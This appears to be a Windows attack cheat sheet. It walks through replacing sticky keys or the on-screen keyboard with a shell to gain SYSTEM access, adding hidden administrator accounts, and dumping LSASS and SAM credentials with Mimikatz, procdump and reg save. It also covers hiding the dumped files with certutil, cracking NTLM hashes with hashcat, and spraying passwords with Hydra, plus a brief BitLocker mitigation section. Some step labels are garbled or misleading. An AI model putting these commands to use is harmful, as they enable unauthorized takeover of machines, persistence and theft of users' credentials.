# Windows by Windows

## Steps for Repair Mode and Command Prompt
1. **Access Repair Mode**:
   - Boot into Windows Recovery Environment (WinRE).
   - Navigate to:  
     **Troubleshooting > Command Prompt**.

2. **Enumerate Drives**:
   ```cmd
   wmic logicaldisk get deviceid, volumename, description, size
   ```

3. **Create Backup**:
   ```cmd
   copy sethc.exe sethc.bak
   ```

4. **Save Filing**:
   ```cmd
   copy cmd.exe sethc.exe
   ```

5. **Shutdown**:
   ```cmd
   shutdown /r /f /t 0
   ```

6. **Press Shift Key Multiple Times**:
   - This triggers the sticky keys prompt, which now opens Command Prompt.

7. **Check Current User**:
   ```cmd
   whoami
   ```
   - Expected output: `NT AUTHORITY\SYSTEM`.

8. **Create a New User**:
   ```cmd
   net user hacker 1234 /add
   ```

9. **Add User to Administrators Group**:
   ```cmd
   net localgroup administrators hacker /add
   ```

10. **Show Users**:
    ```cmd
    net user
    ```

11. **Show Administrators Group**:
    ```cmd
    net localgroup administrators
    ```

12. **Hide User from Command Search**:
    - Append `$` to the username:
    ```cmd
    net user hoshea$ /add
    ```

---

# Windows by Kali Linux

## Steps for Bypassing Windows Defender
1. **Boot into Kali Live**:
   ```bash
   sudo su
   ```

2. **Enumerate Partitions**:
   ```bash
   lsblk
   fdisk -l
   ```

3. **Mount Windows Partition**:
   ```bash
   mount /dev/sda[number] /mnt
   ```

4. **Navigate to System32**:
   ```bash
   cd /mnt/Windows/System32
   ```

5. **Create Backups**:
   ```bash
   cp ftp.exe ftp.bak
   cp osk.exe osk.bak
   ```

6. **Bypass Defender**:
   ```bash
   cp ftp.exe osk.exe
   ```

7. **Sync and Reboot**:
   ```bash
   sync
   reboot -f
   ```

8. **Remove Kali Live and Open On-Screen Keyboard**:
   - The On-Screen Keyboard (osk.exe) now opens an FTP terminal.

9. **Execute Commands**:
   - Prefix commands with `!`:
     ```bash
     !whoami
     !net user
     ```

---

# Mitigation Techniques

1. **Encrypted Drive (BitLocker)**:
   - Enable BitLocker encryption to prevent unauthorized access.

2. **BIOS Password**:
   - Set a BIOS password (though it can be bypassed).

3. **Restricted Access**:
   - Limit physical and remote access to sensitive systems.

---

# Enable BitLocker Encryption

1. **Group Policy Configuration**:
   - Path:  
     **Gpedit > Computer Configuration > Administrative Templates > Windows Components > BitLocker Drive Encryption > Operating System Drives**.
   - Policy:  
     **Require additional authentication at startup**.
   - Action:  
     **Enable > OK**.

2. **Turn on BitLocker**:
   - Open **Control Panel > BitLocker Drive Encryption**.
   - Choose **Password** and enter a strong password.
   - Save the recovery key to a secure location.
   - Encrypt the entire disk.
   - Run the BitLocker system check and restart.

---

# Hide User from Winlogon

1. **Registry Editor**:
   - Path:  
     **HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon**.
   - Create a new **Key** named `SpecialAccounts`.
   - Inside `SpecialAccounts`, create another **Key** named `UserList`.
   - Add a **DWORD (32-bit)** value with the username as the name.

2. **Restart**:
   - The user will no longer appear on the login screen.

---

# Authentication Mechanisms

1. **SAM (Security Account Manager)**:
   - Local file storing user credentials.

2. **NTDS.dit**:
   - Used in Active Directory for domain users.

3. **LSASS (Local Security Authority Subsystem Service)**:
   - Handles authentication and stores credentials in memory.

---

# Mimikatz for Credential Dumping

1. **Download Mimikatz**:
   - [Mimikatz GitHub](https://github.com/ParrotSec/mimikatz).

2. **Dump LSASS Memory**:
   ```cmd
   privilege::debug
   log
   sekurlsa::logonpasswords
   ```

3. **Dump SAM**:
   ```cmd
   privilege::debug
   token::elevate
   lsadump::sam
   ```

---

# Manual Credential Dumping

1. **LSASS Dumping**:
   - Use **Task Manager** or **Procdump**:
     ```cmd
     procdump.exe -ma lsass.exe c:\lsass.dmp
     ```

2. **SAM Dumping**:
   - Use **PsExec**:
     ```cmd
     reg save hklm\sam c:\sam.hiv
     reg save hklm\system c:\system.hiv
     ```

3. **Hide Files**:
   - Use `certutil`:
     ```cmd
     certutil -encode sam.hiv sam.crt
     certutil -decode sam.crt sam.hiv
     ```

---

# NTLM Cracking

1. **Online Tools**:
   - [Hashes.com](https://hashes.com/en/decrypt/hash).

2. **Hashcat**:
   ```bash
   hashcat -a 0 -m 1000 [hash-file] [password-list] --force
   ```

---

# Password Spraying

1. **Hydra**:
   ```bash
   hydra -L [username-file] -p [password] [target-IP] [protocol]
   ```

---
